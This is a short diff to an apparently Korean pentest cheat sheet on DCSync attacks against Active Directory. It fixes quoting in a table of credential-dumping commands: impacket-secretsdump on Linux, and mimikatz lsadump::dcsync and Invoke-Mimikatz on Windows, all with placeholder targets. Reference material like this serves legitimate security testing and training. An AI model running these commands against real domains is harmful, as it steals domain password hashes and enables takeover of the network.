@@ -47,7 +47,7 @@ AD 환경에서 여러 개의 DC가 존재하는 경우, 모든 DC의 데이터�
 | Linux                                     | Windows               |
 |:------------------------------------------|:----------------------|
 | `impacket-secretsdump <domain>\<user>@<ip>`|`mimikatz # lsadump::dcsync /domain:<domain> /user:<domain>\user`|
-| `impacket-secretsdump -just-dc <user>:"<password>"@<ip>` | `Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<domain> /user:<domain>\<user>`|
+| `impacket-secretsdump -just-dc <user>:"<password>"@<ip>` | `Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<domain> /user:<domain>\<user>"'`|
 
 {: .warning }
 > `/user:` 란에 `domain.com`이 아닌 `domain`을 써야될때가 있습니다.
